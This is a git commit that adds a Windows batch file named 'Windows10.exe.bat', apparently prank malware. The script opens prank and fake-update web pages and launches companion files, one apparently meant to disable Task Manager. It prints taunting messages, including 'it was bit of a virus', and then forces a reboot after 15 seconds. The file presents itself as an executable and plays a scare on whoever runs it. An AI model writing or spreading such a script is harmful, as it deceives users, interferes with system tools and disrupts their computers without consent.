0c8e8d1b29aaac5f864d3b40cb4c92cacdf5e7e8
Microshaft <41166367+MicroshaftCorp@users.noreply.github.com>
2018-08-22 21:00:16 -0700

    Create Windows10.exe.bat

---
+++ Windows10.exe.bat
@@ -0,0 +1,16 @@
+@echo off
+start https://www.prankdial.com/us/pranks/securing-our-border
+start TaskGOAway.cs
+timeout 4
+start EXE.js
+start Windows10Evil.gif
+echo Do You Want Windows 10?
+pause
+start http://fakeupdate.net/win10/
+echo i dont care
+timeout 4
+start http://fakeupdate.net/win10u/
+echo You Have been pranked,it was bit of a virus but.
+start Enable.cs
+echo GOODBYE. you can now use task manager.
+shutdown.exe /r /t 15
